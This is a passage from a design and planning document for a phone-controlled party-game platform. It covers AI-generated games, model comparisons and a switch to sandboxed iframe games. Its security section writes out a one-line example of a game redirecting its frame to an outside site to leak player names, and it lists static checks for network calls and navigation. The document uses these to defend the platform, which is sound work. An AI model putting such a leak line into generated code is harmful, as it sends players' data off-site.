| **K4 Kit reference + `/kit` page + examples** ✅ _done 2026-10-14: `GET /api/kit` (the catalog, built from the block definitions; the AI's markdown reference is built from the same catalog, so no separate KIT.md file) and a public `/kit` page with live previews; Reaction Race on the `reaction` widget (fastest time wins, all times listed); new official games **Sketch & Guess** (drawPad + guesses) and **Fill the Blank** (write, then vote). The harness caught two real limits while writing them: `choice` now allows 12 options (one per other player), and big reveals must stay under 60 blocks_ | `KIT.md` generated from the definitions; public `/kit` playground; Reaction Race on `reaction`; Sketch & Guess; the text-answers game; e2e tests | Open `/kit` and try every block; play the new examples with phones |
| **K5 Generator on v3** ✅ _done 2026-10-14: examples are Reaction Race, Sketch & Guess and Fill the Blank (Majority Rules left out to keep the prompt ~15k tokens); the spec gains "Make it a real party game", players' input, widget timing and 12-player limits; the reference warns that widgets restart on a new screen. The comparison (§12j) found a platform bug (12-drawing galleries were over the 96 KB screen limit; now 256 KB, and bots draw full-ink drawings) and two spec gaps (late widget results, answers leaked by a slider)_ | Prompt built from `KIT.md` + new examples; spec rewritten for v3; re-run the comparison with the drawing and reflex ideas | `npm run generate` makes a drawing game and a reflex game that pass and are fun |
| **K6 Versions + change requests** ✅ _done 2026-10-14: migration 4 (`game_versions`; existing games become v1, live as they were; "rejected" = nothing live); a game has a published version (everyone, runs as `g-…`) and a playtest version (owner only, runs as `g-…-vN`) side by side (Q14); "ask for changes" sends the original idea, earlier requests, the base version's code and the request, and the model answers with a `CHANGES:` list plus the full file; the admin page shows each version's request, changelog, test report and changed lines (hand-written LCS line diff in `server/src/generation/lineDiff.js`); publishing swaps versions only once the new one has loaded; `npm run admin -- set-live` replaces `set-status`_ | `game_versions` migration; revision jobs (current code + request); version history, changelog, changed-lines view; playtest/publish a version; rollback | Ask a game for a change → new version in review → playtest it → publish it; old version restorable |

### 12i. Risks and open questions

- **Prompt size.** The kit reference plus 3–4 example games is a much longer prompt. That's fine for both models' context windows, but slower. Keep `KIT.md` tight and pick examples carefully.
- **More surface to review.** Inputs are where cheating and junk come from, which is why the platform validates them, not each game.
- **Phone performance.** Drawing pads and fast widgets on cheap phones. Keep widgets simple (canvas, no libraries) and test on a real low-end phone.
- **Q13 (decided in K4):** `/kit` is public. It's documentation and shows off the platform, and it contains nothing secret.
- **Q14 (decided 2026-10-14): yes.** Other hosts keep the published version while you playtest a newer one; your game picker shows both ("Silly Sketch" and "Silly Sketch (AI-made, v3 playtest)").

### 12j. Model comparison on v3 (K5, 2026-10-14)

Four ideas, run in the sandbox with `npm run generate` (six runs in parallel). The original drawing and reflex prompts weren't saved, so these are rewritten versions of them.

| Idea | gpt-oss:120b | qwen3.8:27b |
|---|---|---|
| Drawing: everyone draws a different silly prompt, then votes on the gallery | ✅ 1st try, 52 s | ✅ 1st try, 131 s |
| Reflex: reaction, mashing, timing bar and tap-target rounds | ✅ 2nd try, 95 s | ✅ 2nd try, 317 s |
| Guess the Number (slider) | ✅ 2nd try, 76 s | not run |
| Rank It (rank) | ✅ 1st try, 51 s | not run |

**What reading the code found** (the tests can't judge game logic):

| Game | Good | Wrong |
|---|---|---|
| Drawing, gpt-oss | drawPad, gallery, timer and progress bars | The gallery has no names or numbers, but the vote buttons say "Vote for Alex's drawing": you can't tell which drawing is whose, and votes aren't anonymous |
| Drawing, qwen | The best of the batch: numbered gallery, your own drawing left out of your vote, names revealed afterwards | Crashed when fewer than 2 players drew (an empty grid). Found by the stronger bots below |
| Reflex, gpt-oss | All 4 widgets | Mashing and tap-target rounds end at the exact moment phones send their results, so most results would be lost. The reaction widget only appears at GO, so false starts are impossible |
| Reflex, qwen | All 4 widgets used correctly: sent once, never re-sent, 1.5 s grace for late results | False starts and players with no result can still win placement points |
| Guess the Number, gpt-oss | slider, reveal grid | The slider gives the answer away: max = 2 × answer + 20, and the start value *is* the answer when it's under 50 |
| Rank It, gpt-oss | rank, average-ranking reveal | Never says what the order means (best? favorite?); the reveal's "points earned here" is always 0 (player scores read by item index) |

**Fixed because of this run:**
- **Platform:** a full drawing is up to 18 KB, so a gallery of 12 is ~220 KB, over the 96 KB screen limit. Both drawing games would have crashed at a full party. The bots only drew ~0.4 KB scribbles, so the harness never saw it. Now one bot drawing in four uses all the ink, and screens may be 256 KB.
- **Spec:** wait ~2 s after a `mash`/`tapTargets` ends before ending the round; never let a slider's range or start value depend on the answer.

**Takeaways:**
- **The kit does its job.** Every run used the block made for the idea (drawPad, all four widgets, slider, rank), and all 6 passed, 3 on the first try. Before K1, the drawing and reflex games couldn't be made at all.
- **qwen designs better games again** (fewer logic bugs, and it followed the widget rules), but it's 2–3× slower. **Decided 2026-10-14: qwen3.8:27b is the only model; gpt-oss:120b is dropped.** Better games are worth a few minutes' wait, especially with a good spec. The admin page shows the model instead of a picker; adding one back is a line in `generator/src/models.js`.
- **Passing the tests ≠ a good game.** Every gpt-oss game had a logic or design bug that only reading or playtesting finds. That's what K6's "ask for changes" is for: describe the bug, get a new version.
- The bots matter as much as the checks: a test is only as good as the inputs it tries.

---

## 13. Frame games: each game brings its own page (branch `iframe-games`, decided 2026-10-15)

> **This section lives only on the `iframe-games` branch.** `main` keeps the game dev kit (§12). If frame games work out, the branch is rebased onto `main` and this becomes the plan; if not, we go back to `main` and nothing there changed.

### 13a. Why

After K6, the kit was still the limit, in the same way the 5 screens were before it:
- every new kind of interaction needs a new hand-written block, plus its checks, bots and docs
- drawings have to fit in a 256 KB screen
- widgets need timing workarounds (the 2 s grace period)
- every game looks the same, and nothing can move or animate

**The mentor's advice (2026-10-15):** "you'd want to do stuff with iframes, i.e. the game server should not care about the design of the game beyond the concept of 'events'."

**Decided (2026-10-15):**
- **Each game is a web page** that runs in a sandboxed **iframe** (a page inside a page) on the big screen and on every phone. It draws whatever it wants.
- **The game's logic runs in the big screen's iframe** (option B, the AirConsole model). The server only passes **events** between the big screen and the phones, and **never runs game code**.
- **Frames only on this branch.** The block games, the kit, the GameRunner and the harness are removed, not kept side by side. The games will be new ones.
- **The first game is new**: one the kit could never do (13g).
- **Any kind of game (decided 2026-10-15; narrowed 2026-10-16, §22).** Not only party rounds: an RPG, a platformer or anything else must be possible. The platform assumes as little as it can about what a game is (13h). _Since §22 the focus is the genres that fit phones-as-controllers; the platform still doesn't forbid others._
- **Generation becomes two approved steps (decided 2026-10-15): design first, then code.** The model first writes a design, and you read it, ask for changes or edit it. Only the design you approve gets built (13i). This is the same plan-then-build process you use when working with Claude Code.
- **Two more example games, with ASCII art:** a platformer and an RPG (13j). Text characters are the art, so no asset files are needed. _(Both removed on 2026-10-16, §18.)_

**This reverses three earlier decisions:** Q1 (declarative views, §4a), E6 ("no generated UI code ever runs in a browser", §5), and "free HTML/JS is not built" (§12a). The protection moves from "the platform draws everything" to "the browser's sandbox walls the game in" (13e).

**The big win:** today a broken or malicious AI game runs inside the server process (§11e). Then it runs inside one browser tab, walled off from the site, and the server only forwards small JSON messages.

**Another win: games can make their own art.** A game can draw on a `<canvas>` or use text characters (ASCII), so it isn't limited to the approved asset library (§4b). Approved assets stay available through `party.asset(id)`.

### 13b. The big picture

```
 Big screen (/host)                       Server                        Phone (/join)
 ┌───────────────────────────┐                                         ┌──────────────────────┐
 │ platform: room code, ⚙    │                                         │ platform: name, ⚙,   │
 │ ┌───────────────────────┐ │   game:event    ┌──────────────────┐    │ leave                │
 │ │ GAME (iframe, host)   │◀┼─────────────────│ rooms + players  │◀───┼─┐                    │
 │ │ - the rules + timers  │ │                 │ forwards events, │    │ │┌─────────────────┐ │
 │ │ - scores, who won     │─┼────────────────▶│ checks size/rate │────┼─┼▶ GAME (iframe,   │ │
 │ │ - draws the big screen│ │ game:send/state │ remembers state  │    │  │ player): draws  │ │
 │ └───────────────────────┘ │  game:end       └──────────────────┘    │  │ the controller  │ │
 └───────────────────────────┘                                         │  └─────────────────┘ │
                                                                       └──────────────────────┘
```

- **Phones send events to the big screen only.** The big screen sends to one phone or to all of them. Phones never talk to each other directly.
- **The big screen's game is the referee**, as GameRunner's game is today. Whatever it decides (scores, who won) is final. Cheating is limited to what a phone sends, and the game checks that, as before.
- **The server still owns** rooms, codes, joining, reconnecting, accounts, the game list, generation, and when a game starts and ends.

### 13c. A frame game is one HTML file

```html
<script type="application/json" id="game-info">
  { "name": "Bumper Blobs", "description": "Push everyone off the ice.", "minPlayers": 2, "maxPlayers": 12 }
</script>
<style> /* whatever it likes */ </style>
<canvas id="arena"></canvas>
<script>
  party.ready(({ role, me, players }) => {
    if (role === 'host') startReferee(players); // the big screen: rules + drawing
    else showJoystick(me);                      // a phone: the controller
  });
</script>
```

- **One file, both roles.** The same page runs on the big screen and on phones; `party.role` says which. AI generation already produces one file, and versions, diffs, the source column and review all keep working unchanged. The two roles share constants, so they can't disagree about them.
- **A fragment, not a whole document.** The platform wraps it in its own `<html><head>`, with the security policy and the `party` SDK first (13e).
- **`game-info`** is plain JSON. The server reads it with `JSON.parse` and **never runs the file**, not even to get its name.
- **Where it's stored:** official frame games are files in the repo (`server/src/games/<id>/game.html`). Generated ones go in the DB, as now.

### 13d. The `party` SDK (what a game can do)

The platform injects a small script before the game's own code. This is the whole contract, the replacement for `ctx`:

| On | Call | What it does |
|---|---|---|
| both | `party.ready(fn)` | `fn({ role, me, players, theme, restored })` runs once the platform is connected. `me` is the player id (null on the big screen). `restored`: the big screen's last save, after a reload (F1) |
| both | `party.now()` | Server time in ms (with clock-offset correction), so timers agree across screens |
| both | `party.asset(id)` | URL of an approved asset from the manifest (§4b) |
| phone | `party.send(data)` | An event to the big screen's game (any JSON, size-capped) |
| phone | `party.on('message', fn)` / `party.on('state', fn)` | Messages and the latest state from the big screen |
| big screen | `party.on('event', fn)` | `fn(playerId, data)`: an event from a phone |
| big screen | `party.sendTo(playerId, data)` / `party.sendAll(data)` | One-off **messages** ("you were hit!"). Copied as JSON when called and sent in batches at most every 50 ms (F1), so a game can call these every frame |
| big screen | `party.setState(playerId \| 'all', state)` | **Sticky state**: the server keeps the latest per phone and replays it after a reconnect, so games can't forget reconnects (the lesson from A1) |
| big screen | `party.save(snapshot)` | Kept by the server (latest only) and handed back as `restored` if the big screen reloads (F1). Never sent to phones: it may hold secrets |
| big screen | `party.on('left', fn)` / `party.on('back', fn)` | A phone dropped / came back |
| big screen | `party.end({ rankings, scores? })` | The game is over; checked by the server as `endGame` is today |
| both | `party.ui.*` (F2) | Ready-made pieces: `el` (builds elements; children are text, never HTML), `joystick`, `gamepad` (hold buttons), `timer`, `scoreboard`, `drawPad` / `drawing`, `ascii` (a coloured character grid). Plus a base style (`base.css`) so a game with no CSS still looks like BoilerGames in both themes |

**Two kinds of message, on purpose:**
- **Messages** are fire-and-forget. If a phone is offline when one is sent, it misses it.
- **State** is "what this phone should show now". The latest one is kept and replayed after a reconnect.

### 13e. Walls around the game (security)

Every walls-in measure is something the **browser** enforces, not our code:

1. **`<iframe sandbox="allow-scripts">`**, without `allow-same-origin`. The game runs as an anonymous origin ("null"). It **can't read** our page, the login cookie, localStorage or sessionStorage (the room tokens). It also **can't redirect** our page, open popups, or submit forms.
2. **A Content-Security-Policy** (a list of what a page may load), put first in the wrapped document:
   `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob: <our site>/game-assets/; media-src <our site>/game-assets/`
   There's no `connect-src`, so the game **can't** use `fetch`, WebSockets or beacons, and can't load scripts or images from anywhere else. Its only way out is `postMessage` to our page.
3. **Our page checks every message from the iframe:**
   - it came from *that* iframe (`event.source`)
   - it has the right shape
   - it fits the size limit

   Only then does it go to the server, which checks everything again (sizes, rate, player ids, results).
4. **The code arrives over the room's WebSocket** (in `game:started`), so only people in the room get it. It's put in the iframe's `srcdoc`, which needs no extra server and no second domain.

**What the walls don't stop, honestly:**
- **A game can still *draw* anything,** including a fake "log in again" form. **Accepted (2026-10-15):** every game is approved by the admin before anyone can play it, and players are guests with no passwords.
- **A game can send its own iframe to another site,** for example `location.href = "https://some-site.com/?names=…"`. CSP can't block this, and neither can the sandbox. What that means:
  1. **It can leak what the game knows** in the address: player names, drawings, typed answers. It **can't** leak cookies, logins, room tokens or the room code, because the game never gets those.
  2. **That site sees every player's IP address,** because each phone's iframe loads it.
  3. **An unreviewed page shows in the game's place**, possibly on the big screen. It's still sandboxed, so it can't touch our page. It could send fake events, but they go through the server's checks and can only spoil that one game.

  **Defenses:**
  - **Detect and end (F1).** The platform counts the iframe's `load` events. A second one means the frame went somewhere else: the iframe is removed and the game ends. This can't stop the first request, so the leak in point 1 still happens, but players see at most a flash.
  - **The static check (F4)** rejects navigation in code: `location`, `window.open`, links, forms, meta refresh. This catches AI accidents, not deliberately hidden code.
  - **Your review.** With admin approval, the worst case is a small, non-secret leak from a game approved by mistake. **Accepted (2026-10-15).**
- **A game can hang or slow down one browser tab.** It can never freeze the server or other rooms.
  - **Finding (F1):** a game stuck in an endless loop freezes the **whole big-screen tab**, not just its frame. Tested in Chromium: the iframe runs on the page's own thread, so our page can't notice anything.
  - **So the server watches instead.** The big screen's SDK ticks every second, and the page passes that on as `game:alive` every 2 s. If nothing arrives for 15 s, the server stops the game ("the game stopped responding") and the phones go back to the lobby.
  - **A hidden tab pauses the watch,** because its timers slow right down. A disconnected big screen is left to the 30 s grace period.
  - The frozen tab itself has to be closed by hand.

### 13f. The server becomes a relay

`FrameRelay` (`server/src/games/FrameRelay.js`) replaces `GameRunner`. It sits at the same seam (§5 E2), so RoomManager barely changes.

| Message | From → to | Server checks |
|---|---|---|
| `game:started { gameId, players, source }` | server → everyone | — (now includes the game file) |
| `game:event { data }` | phone → server → big screen as `{ from, data }` | in a game; JSON; ≤ 24 KB (a drawing fits); rate limit |
| `game:batch { items, save? }` (F1; replaced `game:send` / `game:state`) | big screen → phones, in order: `{ to, data }` is a message, `{ to, state }` is remembered and replayed on reconnect; `save` is kept for a big-screen reload | sender is the host; every `to` is a real player id or `all` (checked before anything is delivered); ≤ 100 items; ≤ 32 KB |
| `game:alive { paused? }` (F1) | big screen → server | resets the hang watchdog; `paused` while the tab is hidden |
| `game:end { rankings, scores? }` | big screen → server → everyone as `game:ended` | the same checks as `endGame` today |

- **Rate limits (tuned in F1, without raising them).**
  - Phones' continuous input, like a joystick at ~12 per second, fits the 20/s limit.
  - The big screen's messages go out in batches, at most ~20 a second however busy the game is.
  - The page also refuses anything over the limit before it reaches the server. A flood (tested: 100 events at once) gets one burst through, and the connection survives instead of being closed.
- **The host can always stop a game.** A "Stop game" button outside the frame ends it with no winner. Games can be long (an RPG), so the platform puts no time limit on them.
- **If the big screen disconnects,** phones show "waiting for the host…" as today. If it comes back within 30 s:
  - a page that still runs the game (the connection only blipped) carries on
  - a reloaded page restarts the game from its last `party.save`
  - a reloaded page with no save stops the game ("the big screen reloaded")
- **Why a game stopped** is shown in the lobby on every screen: `stopped` is `host`, `reload`, `unresponsive` or `broken` (it left its frame).
- **Gone from the server:** the kit, screen checks, the offered-actions check, bots, the harness, game timers. Games check phones' events themselves, as they already had to (rule 5).

### 13g. The first game: Bumper Blobs (new, impossible with the kit)

- **The big screen:** an icy circular arena, drawn at 60 frames per second on a `<canvas>`. Each player is a coloured blob with their name on it.
- **Phones:** a joystick. Drag a thumb to steer, sending the direction ~15 times a second.
- **Rules:** blobs bump each other. Get pushed off the ice and you're out. The last blob on wins the round, best of 3 rounds.
- **Why this game:** it needs everything the kit couldn't do:
  - continuous input
  - smooth animation
  - physics
  - a custom controller

  It also tests how real-time feels with the extra hop (phone → server → big screen).

### 13h. Any kind of game

> _Narrowed on 2026-10-16 (§22): the platform below still assumes as little as possible, but
> what we build, test and steer the AI toward are the genres that fit phones-as-controllers._

The aim is that someone can ask for a party round game, a platformer, an RPG, a puzzle, a racing game, anything. So the platform assumes as little as possible:
- **No required shape.** There are no rounds, phases or scoreboards in the contract. The SDK only connects screens. A game only has to start, react to its players, and eventually call `party.end` (or be stopped by the host).
- **Any player count from 1 to 12.** A solo platformer with the big screen as the TV is fine.
- **No time limit.** The host's "Stop game" button replaces it (13f).
- **The phone can be anything:** a joystick, a D-pad with jump, an RPG character sheet with menus, a drawing pad, or just a "buzz" button.
- **The big screen can be anything:** a world map, a side-scrolling level, a table of cards.
- **Templates are help, not rules.** The starter templates (13i) cover common shapes: party rounds, real-time action, turn-based adventure. A game may use one or none. _(Templates were dropped on 2026-10-16, §20.)_
- **Still out of scope:** joining after a game starts (D7) and saving progress between game nights. They come up naturally with RPGs; see Q17 and Q18. _(Not needed for §22's genres.)_

### 13i. Steering the AI: design first, then code

**Today a job goes straight from the idea to code.** That skips the step where the game actually gets designed. The model makes design decisions while it writes code, and the only place you can see them is in the code.

**The new process, two steps, each approved by you:**

```
 idea ──▶ STEP 1: design ──▶ you read it ──┬─ "change X" ──▶ new design draft ─┐
                                           │◀────────────────────────────────────┘
                                           ├─ edit the text yourself
                                           └─ "Build it" ──▶ STEP 2: code (check → fix loop) ──▶ review / playtest
```

- **Step 1, the design.** The model writes a short design document from the idea, with a fixed set of headings:
  - genre and the feel it's going for
  - players (min/max)
  - what the big screen shows
  - what each phone shows and its controls
  - the rules, step by step
  - how it ends and who wins
  - the art approach (canvas shapes, ASCII, or assets)
  - which template it uses, if any
  - edge cases: someone leaves, nobody acts, 1 player vs 12

  This is quick (one model call, no code to test), and it's where most bad games can be caught.
- **You iterate on the design.** Ask for changes (a new draft, with your feedback and the earlier draft in the prompt) or edit the text directly. Each draft is kept.
- **Step 2, the build.** It starts only when you click **Build it**. The prompt contains the **approved design**, so the model follows a plan instead of inventing one, plus the spec, SDK reference, template and examples. The check → fix loop runs as now.
- **Change requests go through the same two steps.** For a version change, step 1 is a short plan of *what will change and why*; you approve it, then it's built. A "skip the design" option for tiny fixes is decided in F5.
- **Data:** versions gain a `design` text and the drafts history. New statuses: `designing` → `design_ready` → (Build it) → `generating` → `ready` / `failed`.
- **The design step also runs in the OpenShell sandbox,** only because that's where the GenAI Studio key lives (§11a). It runs no code.
- **Not tied to frames.** This could be built on `main` for block games too.

**The other levers, roughly from most effect to least:**
1. **Starter templates.** Skeletons where the tricky parts are already right: phases, `setState` for reconnects, checking phone events, `party.end`. The model fills in the rules and the drawing. Less code means fewer bugs and fewer surprises.
2. **Good examples.** This was the biggest lever in both comparisons (§11g, §12j). Three hand-written games of very different kinds: Bumper Blobs (real-time, canvas), an ASCII platformer and an ASCII RPG (13j).
3. **A helper library: "the kit as a library" (F2).** Joystick, D-pad, buttons, timer, scoreboard, drawing pad, an **ASCII grid renderer**, and the shared styles with dark mode, all provided inside the frame. Every helper is code the model doesn't write: fewer bugs, a consistent look, less room for strange code.
4. **A frame-game rulebook in the spec (`GAME_SPEC.md`).**
   - Everything inline: no CDN scripts, Google Fonts or outside images. LLMs do this out of habit; CSP blocks it anyway, but the rule saves failed attempts.
   - No network, no navigation, only the `party` SDK.
   - Phones: big tap targets, one thumb, portrait.
   - Big screen: readable from across the room.
   - 1–12 players must work; nothing waits forever on a player who left.
   - A maximum file size (e.g. 150 KB), which also leaves no room for hidden blobs of code.
5. **Checks in the fix loop (F4).** Each failure goes back to the model as a clear error, as the harness does today.
   - **Static check:** network calls, navigation, `eval`, outside URLs.
   - **Headless-browser playtest:** simulated phones send events. The game must start, take input, draw something (screenshot not blank) and throw no errors.
   - Browsers report every CSP violation as an event, so the test sees a game *trying* to reach the network, not just failing to.
   - Long games (an RPG) don't have to finish in the test. The test plays for a while and then checks the host's stop works.
6. **Review help on the admin page (F4).** Screenshots of the phone and the big screen from the browser test, the check results, and flagged lines highlighted.

**On malicious code:** the model isn't trying to attack anyone. The realistic risks are its habits (CDN scripts, outside fonts) and, from A7 on, other people's ideas containing instructions aimed at the model. The templates, rulebook and static check handle the first; the sandbox, CSP and admin approval handle the second.

**Game length (found in F5's live test, 2026-10-15).** The first live design, a racing
platformer, had 40-column tracks: about 7 s per round and 2 minutes per game. The model never
works out how long its game lasts (and our own Tower Dash, its closest example, is about as
short). Three ways to steer it:
1. **A "Length" heading in every design, with the arithmetic** (distance ÷ speed, timers ×
   rounds). **Chosen and built (2026-10-15).** The example designs got honest Length sections.
2. **A default target in the rulebook:** about 5–15 minutes per game unless the idea says
   otherwise; at least ~20 s per round or level; DESIGN.md says to change the design, not
   just report a total outside that. **Built (2026-10-15), after the experiment in 13n.**
3. *A length choice on the new-game form* (Quick ~3 min / Normal ~10 min / Long 20+ min; and
   `--length` in the terminal), sent to the model as a fixed value, never free text. **Not
   yet: to test later.**

**Size limits raised (2026-10-15), as games will get bigger:** game files 1 MB on the
server (was 512 KB) and 300 KB in the AI's rulebook (was 150 KB); the current code sent with a
change request 300K characters; one message from the big screen 120 KB (was 30 KB), so a
`party.save` snapshot (a whole RPG) can be ~110 KB; the WebSocket cap 128 KB (was 32 KB);
a phone's event 48 KB (was 24 KB). **Corrected the same day:** the model's context is 65,536
tokens (RCAC's model list), and a change request holds the old game and the new one, so
AI-written games are limited to **100 KB** (~25–30K tokens; ours are 19–29 KB), and so is the
code sent with a change. The fix loop now sends only the newest attempt back, not all of them:
each attempt is ~10K tokens, and keeping them all would overflow the context by attempt 4.

### 13j. Example games (hand-written, also the AI's examples)

| Game | Kind | Big screen | Phones | Players |
|---|---|---|---|---|
| **Bumper Blobs** (F0) | Real-time party | An ice arena on a canvas at 60 fps | A joystick | 2–12 |
| **Tower Dash** (F3), an ASCII platformer | Real-time platformer | A side-on level made of text: `#` walls, `=` platforms, `^` spikes, `$` coins, `>` the exit. Each player is a coloured letter | Left, right, jump | 1–8: race to the exit, coins break ties; 3 levels |
| **Dungeon Party** (F3), an ASCII RPG | Turn-based co-op adventure | A dungeon map in text (`@` heroes, `g` goblins, `D` the dragon) and a battle log | Each player's hero: HP, items, and a menu of moves on their turn | 1–6: explore rooms, fight, beat the boss; scores from damage dealt and gold |

The two ASCII games also stress-test the SDK for genres that aren't party rounds, before the AI is asked to make them.

### 13k. What's removed on this branch

- **Server:** `GameRunner.js`, `contract.js`, `kit/`, `harness/`, the four block games, `game:action`, `/api/kit`. Also the screen-size and widget settings in `config.js`.
- **Client:** `game/blocks/`, `GameScreen.jsx`, the `/kit` page and its link from the home page.
- **Generator:** its prompt, spec and examples are written for blocks. **Generation is switched off on the branch until F5** ("not available for frame games yet"). The admin page, versions, diffs and the sandbox stay.
- **Stored AI games** (Silly Sketch, Reflex Frenzy) are block games. They fail their load check and are skipped. They aren't deleted, so `main` can still run them from the same database.
- **No database changes in F0.**

### 13l. Milestones (branch `iframe-games`)

| M | Goal | You can run / review |
|---|---|---|
| **F0 Spike** ✅ _done 2026-10-15: `server/src/games/frameGame.js` (reads only the game-info JSON) and `FrameRelay.js`; `client/src/game/GameFrame.jsx` (srcdoc, sandbox, message checks, a client-side rate limit matching the server's), `frame/frameDocument.js` (CSP) and `frame/sdk.js`; **Bumper Blobs** (joystick + Dash + arrow keys; shrinking ice; best of 3). The host's **Stop game** button came forward from F1. A big-screen reload stops the game. A browser test tries nine ways out of the sandbox on both screens (all blocked; with `allow-same-origin` a game could read the host token). The generator is switched off with a clear reason; stored block games are skipped at startup. Changes from the plan: phone events may be up to 24 KB (not 8); `host:start_game` no longer takes options_ | Remove the block games (13k); `FrameRelay` + the new messages; `GameFrame.jsx` (srcdoc wrapper, CSP, message checks); the `party` SDK basics; Bumper Blobs; tests: relay unit tests, and e2e tests that play a round and prove the walls (the iframe can't read the cookie or storage, `fetch` is blocked) | Play Bumper Blobs on the big screen with 2+ real phones (Tailscale works). **Go/no-go:** does it feel smooth, and is it worth the cost? |
| **F1 Robustness** ✅ _done 2026-10-15: `game:batch` (SDK batches every 50 ms) and `party.save`/`restored`; the server-side hang watchdog (the hung frame freezes the whole tab, so the page can't notice); a frame that loads another page is removed (phone) or stops the game (big screen); the lobby says why a game stopped; Bumper Blobs saves and survives a big-screen reload. Q15 decided: phones need nothing more than sticky state_ | Big screen save/restore; heartbeat (hung frame → game ends); frame navigation → game ends (13e); tune rate limits. (Sticky state replay and the Stop game button were done in F0.) | Refresh a phone and the big screen mid-game; a deliberately broken or redirecting game ends cleanly |
| **F2 Look and feel + helpers** ✅ _done 2026-10-15: `client/src/game/frame/base.css` (in `:where()`, so a game's own CSS always wins; the big screen scales up) and `frame/ui.js` as `party.ui`: `el`, `joystick`, `gamepad`, `timer`, `scoreboard`, `drawPad` + `drawing`, `ascii`. Tested end to end with a test-only UI Demo game; Bumper Blobs uses the shared joystick_ | The kit as a library inside frames: base stylesheet (colour tokens, buttons, dark mode from `party.theme`), joystick, D-pad, timer, scoreboard, drawing pad, ASCII grid renderer | A plain game looks right in both themes; Bumper Blobs uses the shared joystick |
| **F3 Example games + templates** ✅ _done 2026-10-15: **Tower Dash** (`server/src/games/tower-dash/`: 3 levels, gamepad ◀ ▶ Jump; its physics block is pure, and a throwaway solver checked every level can be finished) and **Dungeon Party** (`dungeon-party/`: 6 rooms, door votes, Knight/Mage/Cleric/Rogue vs goblins, spiders, skeletons and the dragon; balanced by party size, not yet by real players); `generator/templates/` rounds (Unique Number), realtime (Star Catch) and turns (Treasure Hunt), each played in the browser tests. Base-style fix: `.screen` fills the frame_ | The ASCII platformer and the ASCII RPG (13j); starter templates (party rounds, real-time, turn-based adventure) taken from the three games | Play both with phones; each template runs as a tiny working game |
| **F4 Checking games** ✅ _done 2026-10-15: `server/src/games/staticCheck.js` (code rules skip strings and comments; errors fail, "worth a look" warnings don't; part of every version's report on the server); `generator/src/check/` (`checkGame.js`, `playtest.js`, `npm run check-game`): headless Chromium through `playwright-core` (the generator's one dependency, approved 2026-10-15), one page per screen, the server's real `FrameRelay` in between, bots, a phone reload and a big-screen reload with its save; reports errors with their line, CSP reports, requests, leaving the frame, hangs, blank screens, silent phones, refused messages and results, plus JPEG screenshots. All three games and templates pass; 8 fixtures in `generator/test/` hide each mistake from the static check so only the browser can find it. Admin page: findings with screen and line, screenshots, flagged lines marked in the code. Image: Chromium under `/app/ms-playwright` (~1.2 GB), verified inside OpenShell. Two findings there: the sandbox forbids user namespaces, so Chromium runs with `--no-zygote --disable-gpu` (else it crashes on the first page); and other pages can share a frozen page's process, so the hang watchdog runs on its own timer. **WSL:** mirrored networking (`networkingMode=mirrored`) puts a seccomp listener on every WSL process, and OpenShell's supervisor needs its own, so no sandbox can start (EBUSY, "notification launcher disappeared"). Back to NAT mode on 2026-10-15; phones reach the dev server through Tailscale installed inside WSL_ | Static check plus a **headless-browser** playtest with simulated phones, CSP violation reports and screenshots; screenshots and flags on the admin page. Needs Chromium in the generator image (ask before adding Playwright there) | `npm run check-game game.html` passes the three examples; broken fixtures (network, navigation, throws, blank screen) fail clearly |
| **F5 Two-step generator** ✅ _built 2026-10-15 (live test with the real model pending): `generator/spec/GAME_SPEC.md` (the rulebook: rules the checks enforce, phones and big screen, the party SDK, party.ui, base styles), `DESIGN.md` (fixed headings, incl. Template and Closest example) and designs of the three official games. `generator/src/run.js` runs one step per sandbox job: **design** (one call, a retry if headings are missing; a redraft sends the last draft and your feedback) or **build** (rulebook + the template and closest example the design names, the example WITH its design; then write → checkGame → fix, up to 4 attempts, 15 s playtests, 150 KB limit). Changes: a short **plan** first (What changes / What stays the same / Risks), then the build; **"Small fix: skip the plan"** decided as a checkbox. Server: migration 5 (statuses `designing`, `design_ready`; columns `design`, `drafts_json`, `design_feedback`), redesign / edit / build / discard routes; a failed build keeps its design to change or build again; a restart sends a cut-off redraft back to its last draft. Admin page: the design as formatted text (`Markdown.jsx`, React elements only), Build it, Edit it myself, Ask the AI for a new draft, earlier drafts. `/kit` is back as the guide (`GET /api/kit` sends the same spec files the AI reads). `npm run generate` is two-step in the terminal. Generation is switched on again_ | Design step (13i), design drafts and edits on the admin page, "Build it"; spec rulebook, SDK reference, templates and examples in the prompt; change requests as plan → build; generation switched back on; `/kit` comes back as the SDK docs | Idea → read the design → ask for a change → Build it → a frame game that passes and is fun (try a platformer and an RPG idea) |
| **Decide** ✅ _decided 2026-10-16: frame games became `main` (a fast-forward, no history rewritten); the block-game version lives on in the branch `block-games` (main as of 644b02c)_ | Rebase onto `main` (this becomes the plan) or drop the branch | |

### 13m. Risks and open questions

- **The big screen is the referee.** A slow or busy host laptop slows the game for everyone, and browsers slow down timers in background tabs, so the big screen tab must stay in front.
- **Latency:** phone → server → big screen is one hop more than block games. On the same Wi-Fi that's tens of milliseconds. Bumper Blobs will show whether it's noticeable.
- **AI-written UI** is more code to get wrong and more to review. F4 (testing in a real browser) matters more than the harness did.
- **Phones:** canvas games on cheap phones, battery, and audio (browsers only play sound after a tap).
- **Long games** (an RPG) make a big-screen refresh more painful, so F1's save/restore matters more. _(Less pressing with §22's genres: short rounds.)_
- **Bigger designs, bigger files.** An RPG is more code than a party round. Keep an eye on the file-size cap, the prompt size and qwen's time per attempt. _(Less pressing with §22's genres.)_
- **Q15 (decided in F1): sticky state is enough.** A phone is a controller. Its `state` from the big screen is what it should show, and it comes back after a reload; anything else on the phone is the game's own business.
- **Q16 (decided 2026-10-16):** the block games are kept in the branch `block-games`, not in the live code. Bringing them back as a frame game that draws blocks stays possible.
- **Q17:** let players join a game that's already running (drop-in for RPGs)? D7 says no for now. _Shelved (§22): it came from RPGs. Short party games just start a new round._
- **Q18:** save a game's progress between game nights (an RPG campaign)? Would need storage per game; out of scope for now. _Shelved (§22)._

### 13n. Future: the game library as AI data (idea, 2026-10-15)

**What the live F5 test showed:** both live designs copied their closest example closely (the
platformer took Tower Dash's 48-tile scale and physics; the RPG took Dungeon Party's four
classes, 30 s turns and Defend-on-timeout). On `main`, examples were the biggest lever on
*working code* (§11g, §12j). So the two steps may want different things:
- **Design step:** example designs mostly cause copying; the design format already teaches
  the structure. Candidate: no example designs (maybe one short sample from a game unlike
  any we'd want copied). Cheap to measure: the same 4–5 ideas with and without (~40 s each).
